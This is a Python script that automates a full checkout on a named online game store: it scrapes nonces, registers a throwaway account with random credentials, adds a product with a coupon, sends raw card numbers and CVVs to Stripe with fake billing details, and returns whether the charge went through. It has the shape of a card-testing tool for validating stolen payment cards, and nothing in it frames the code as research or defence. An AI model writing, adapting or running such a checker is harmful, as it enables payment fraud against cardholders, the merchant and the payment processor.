import requests
import random
import re

def process_card_checkout(card_number, exp_month, exp_year, cvv):
    """Main function to process card checkout - returns result as dictionary"""
    try:
        # Create a session
        r = requests.Session()

        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        }

        # Get the registration page
        response = requests.get('https://legacygames.com/my-account/payment-methods/', headers=headers)

        # Extract nonce with error handling
        match = re.search(r'woocommerce-register-nonce" value="(.*?)"', response.text)
        if match:
            non = match.group(1)
            #print(f"Nonce found: {non}")
        else:
            return {
                "card_used": f"{card_number[:6]}******{card_number[-4:]}",
                "email": "",
                "response": "Error: Could not find registration nonce in response",
                "status": 500
            }

        # Random user/email
        user = f"username{random.randint(10000, 90000)}"
        email = f"{user}@gmail.com"

        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Content-Type': 'application/x-www-form-urlencoded',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'upgrade-insecure-requests': '1',
            'origin': 'https://legacygames.com',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://legacygames.com/my-account/',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        }

        # Registration data
        data = {
            "username": user,
            "email": email,
            "password": "happy//dappy5753",
            "woocommerce-register-nonce": non,
            "register": "Register"
        }

        # Send registration request
        reg = r.post('https://legacygames.com/my-account/', headers=headers, data=data)

        if reg.status_code != 200:
            return {
                "card_used": f"{card_number[:6]}******{card_number[-4:]}",
                "email": email,
                "response": f"Registration may have failed. Response: {reg.text[:500]}",
                "status": reg.status_code
            }

        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'upgrade-insecure-requests': '1',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'referer': 'https://legacygames.com/',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        }

        # Add item to cart
        response = r.get(
            'https://legacygames.com?add-to-cart=1924025&quantity=1&e-redirect=https://legacygames.com/cart/?coupon=HCR-011',
            headers=headers,
        )

        # Extract checkout nonce with error handling
        match = re.search(r'"checkout":"(.*?)"', response.text)
        if match:
            nonce = match.group(1)
        else:
            return {
                "card_used": f"{card_number[:6]}******{card_number[-4:]}",
                "email": email,
                "response": "Error: Could not find checkout nonce in response",
                "status": 500
            }

        # Extract public key with error handling
        match = re.search(r'isUPEEnabled":"1","key":"(.*?)"', response.text)
        if match:
            pk = match.group(1)
        else:
            match = re.search(r'publishableKey":"(.*?)"', response.text)
            if match:
                pk = match.group(1)
            else:
                return {
                    "card_used": f"{card_number[:6]}******{card_number[-4:]}",
                    "email": email,
                    "response": "Error: Could not find public key in response",
                    "status": 500
                }

        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'origin': 'https://js.stripe.com',
            'sec-fetch-site': 'same-site',
            'sec-fetch-mode': 'cors',
            'sec-fetch-dest': 'empty',
            'referer': 'https://js.stripe.com/',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        }

        data = {
            "billing_details[name]": "Happy Dappy",
            "billing_details[email]": email,
            "billing_details[address][city]": "New York",
            "billing_details[address][country]": "US",
            "billing_details[address][line1]": "3311, New York, Usa",
            "billing_details[address][line2]": "",
            "billing_details[address][postal_code]": "10019",
            "billing_details[address][state]": "NY",
            "type": "card",
            "card[number]": card_number,
            "card[cvc]": cvv,
            "card[exp_year]": exp_year,
            "card[exp_month]": exp_month,
            "allow_redisplay": "unspecified",
            "payment_user_agent": "stripe.js/f4aa9d6f0f; stripe-js-v3/f4aa9d6f0f; payment-element; deferred-intent",
            "referrer": "https://legacygames.com",
            "time_on_page": "43252",
            "client_attribution_metadata[client_session_id]": "10f0b5c9-921c-47a5-b81e-f807d80a3d4c",
            "client_attribution_metadata[merchant_integration_source]": "elements",
            "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
            "client_attribution_metadata[merchant_integration_version]": "2021",
            "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
            "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
            "client_attribution_metadata[elements_session_config_id]": "2d41df14-d6d8-47ba-a5cf-82c65655198a",
            "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
            "guid": "NA",
            "muid": "cf6053ed-9213-4fa3-9aca-a6c41a100e42b4e2d8",
            "sid": "NA",
            "key": pk,
            "_stripe_version": "2024-06-20"
        }

        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

        # Extract payment method ID with error handling
        match = re.search(r'"id"\s*:\s*"([^"]+)"', response.text)
        if match:
            payment_id = match.group(1)
        else:
            return {
                "card_used": f"{card_number[:6]}******{card_number[-4:]}",
                "email": email,
                "response": f"Error: Could not find payment method ID in response. Stripe response: {response.text}",
                "status": 500
            }

        params = {
            'wc-ajax': 'checkout',
        }

        data = {
            "wc_order_attribution_source_type": "typein",
            "wc_order_attribution_referrer": "(none)",
            "wc_order_attribution_utm_campaign": "(none)",
            "wc_order_attribution_utm_source": "(direct)",
            "wc_order_attribution_utm_medium": "(none)",
            "wc_order_attribution_utm_content": "(none)",
            "wc_order_attribution_utm_id": "(none)",
            "wc_order_attribution_utm_term": "(none)",
            "wc_order_attribution_utm_source_platform": "(none)",
            "wc_order_attribution_utm_creative_format": "(none)",
            "wc_order_attribution_utm_marketing_tactic": "(none)",
            "wc_order_attribution_session_entry": "https://legacygames.com/my-account/",
            "wc_order_attribution_session_start_time": "2026-01-10 11:07:27",
            "wc_order_attribution_session_pages": "7",
            "wc_order_attribution_session_count": "1",
            "wc_order_attribution_user_agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
            "billing_first_name": "Happy",
            "billing_last_name": "Dappy",
            "billing_country": "US",
            "billing_address_1": "3311, New York, Usa",
            "billing_address_2": "",
            "billing_city": "New York",
            "billing_state": "NY",
            "billing_postcode": "10019",
            "billing_email": email,
            "coupon_code": "",
            "payment_method": "stripe",
            "wc-stripe-payment-method-upe": "",
            "wc_stripe_selected_upe_payment_type": "",
            "wc-stripe-is-deferred-intent": "1",
            "wc-stripe-new-payment-method": "true",
            "ppcp_paypal_order_id": "",
            "ppcp_payment_token": "",
            "ppcp_billing_token": "",
            "woocommerce-process-checkout-nonce": nonce,
            "_wp_http_referer": "https://legacygames.com/checkout/?elementorPageId=187&elementorWidgetId=2fca096",
            "wc-stripe-payment-method": payment_id,
        }

        # Make sure to use the session for consistency
        response = r.post(
            'https://legacygames.com',
            params=params,
            headers=headers,
            data=data
        )

        # Return the response in the format you wanted
        return {
            "card_used": f"{card_number[:6]}******{card_number[-4:]}",
            "email": email,
            "response": response.text,
            "status": response.status_code
        }

    except Exception as e:
        return {
            "card_used": f"{card_number[:6]}******{card_number[-4:]}",
            "email": "",
            "response": f"Exception occurred: {str(e)}",
            "status": 500
        }